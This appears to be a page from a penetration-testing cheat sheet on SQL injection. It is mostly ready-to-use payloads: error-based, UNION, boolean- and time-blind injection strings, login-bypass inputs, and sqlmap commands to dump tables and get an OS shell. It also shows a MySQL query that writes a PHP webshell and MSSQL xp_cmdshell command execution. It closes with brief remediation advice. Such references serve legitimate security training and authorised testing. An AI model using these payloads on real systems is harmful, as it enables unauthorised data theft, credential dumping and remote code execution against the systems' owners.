---
tags:
  - Web
---

# :material-database-arrow-right: SQL Injection

<span class="pill pill-hard">high impact</span> <span class="pill pill-info">web</span>

**SQL injection (SQLi)** happens when user input is concatenated into a SQL query, letting you change the query's *logic*. Impact ranges from auth bypass to full database dump to remote code execution.

!!! abstract "TL;DR"
    Find a parameter that reaches a query, break out of its context, and either read data (UNION / blind) or subvert the app's intent (auth bypass). When manual work gets tedious, hand it to `sqlmap`.

## :material-magnify: Detection

Try these in every parameter (URL, POST body, headers, cookies, JSON):

```text
'                 -- classic error trigger
"                 -- double-quote context
`                 -- MySQL backtick
')  ")  '))       -- break out of function/parentheses
1' AND '1'='1     -- true condition
1' AND '1'='2     -- false condition (page should differ)
1 OR 1=1
1; SELECT 1       -- stacked (driver-dependent)
```

A response that **differs** between the true and false payloads (error, content length, timing) is your signal.

### Fingerprint the DBMS

| Test payload | If it works → |
| --- | --- |
| `SELECT @@version` | MySQL / MSSQL |
| `SELECT version()` | PostgreSQL / MySQL |
| `SELECT banner FROM v$version` | Oracle |
| `SELECT sqlite_version()` | SQLite |
| String concat `'a'\|\|'b'` | Oracle / PostgreSQL |
| String concat `'a'+'b'` | MSSQL |
| String concat `CONCAT('a','b')` | MySQL |

## :material-format-list-numbered: Techniques

=== "Error-based"

    Force the DB to leak data inside an error message.

    ```sql
    -- MySQL (extractvalue)
    ' AND extractvalue(1, concat(0x7e, (SELECT @@version))) -- -

    -- MSSQL (convert error)
    ' AND 1=CONVERT(int,(SELECT @@version)) -- -
    ```

=== "UNION-based"

    Append your own `SELECT` to piggyback data out. First find the column count:

    ```sql
    ' ORDER BY 1 -- -      (increment until it errors)
    ' UNION SELECT NULL -- -
    ' UNION SELECT NULL,NULL -- -   (match the column count)
    ```

    Then find a string-compatible column and extract:

    ```sql
    ' UNION SELECT NULL, table_name, NULL FROM information_schema.tables -- -
    ' UNION SELECT NULL, concat(username,0x3a,password), NULL FROM users -- -
    ```

=== "Boolean-blind"

    No output, but the page changes on true/false. Extract char-by-char:

    ```sql
    ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' -- -
    ' AND (SELECT COUNT(*) FROM users) > 5 -- -
    ```

=== "Time-blind"

    No visible difference at all — use a delay as your oracle.

    ```sql
    -- MySQL
    ' AND IF(1=1, SLEEP(5), 0) -- -
    -- PostgreSQL
    '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END -- -
    -- MSSQL
    '; IF (1=1) WAITFOR DELAY '0:0:5' -- -
    ```

## :material-login: Auth bypass

The oldest trick — turn `WHERE user='X' AND pass='Y'` into always-true:

```sql
Username: admin' -- -
Username: admin' OR '1'='1
Username: ' OR 1=1 LIMIT 1 -- -
```

The `-- -` comments out the rest of the query (the trailing space after `--` matters in MySQL).

## :material-tools: sqlmap

The workhorse for automation. Save a request from Burp to `req.txt` and:

``` { .bash .annotate }
sqlmap -r req.txt --batch --level 5 --risk 3 # (1)!
sqlmap -r req.txt -p id --dbs               # enumerate databases
sqlmap -r req.txt -D shop -T users --dump   # dump a table
sqlmap -r req.txt --os-shell                # try for RCE
```

1. `--level` widens *where* it tests (headers, cookies); `--risk` widens *what* payloads it tries. Crank both when a target is stubborn.

!!! opsec "sqlmap is loud"
    High level/risk sends thousands of requests and can corrupt data with stacked queries. On engagements, prefer targeted manual testing first and use `--technique=BU` to limit noise.

## :material-fire: From SQLi to RCE

<div class="grid" markdown>

!!! loot "MySQL — write a webshell"
    ```sql
    ' UNION SELECT "<?php system($_GET['c']);?>", NULL
      INTO OUTFILE '/var/www/html/s.php' -- -
    ```
    Requires `FILE` privilege and a known writable web path.

!!! loot "MSSQL — command execution"
    ```sql
    '; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
       EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
       EXEC xp_cmdshell 'whoami'; -- -
    ```
    Then pivot to a reverse shell → [Windows Privesc](../privesc/windows.md).

</div>

## :material-shield-check: Remediation (for the report)

- Use **parameterized queries / prepared statements** — never string-concatenate input.
- Apply least-privilege DB accounts (no `FILE`, no `xp_cmdshell`, no DBA).
- Validate/allowlist input types; use an ORM correctly.
- WAFs are a speed bump, not a fix.

## :material-link-variant: Related

- Chains into [File Upload](file-upload.md) and [Deserialization](deserialization.md) for RCE.
- MSSQL `xp_cmdshell` → [Windows Privesc](../privesc/windows.md).
- Dumped creds → spray them in [Active Directory](../network/active-directory.md).
- See also: [OWASP SQLi](https://owasp.org/www-community/attacks/SQL_Injection), [PortSwigger SQLi labs](https://portswigger.net/web-security/sql-injection).
